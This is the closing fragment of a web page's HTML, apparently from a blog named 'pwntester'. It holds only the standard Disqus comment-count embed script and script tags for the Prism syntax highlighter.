        var disqus_shortname = 'pwntester'; // required: replace example with your forum shortname
        /* * * DON'T EDIT BELOW THIS LINE * * */
        (function () {
            var s = document.createElement('script'); s.async = true;
            s.type = 'text/javascript';
            s.src = '//' + disqus_shortname + '.disqus.com/count.js';
            (document.getElementsByTagName('HEAD')[0] || document.getElementsByTagName('BODY')[0]).appendChild(s);
        }());
    </script>

    <script type="text/javascript" src="../../../../assets/js/prism-loader.js?v=d47df0f104"></script>
    <script type="text/javascript" src="../../../../assets/js/prism.js?v=d47df0f104"></script>

</body>

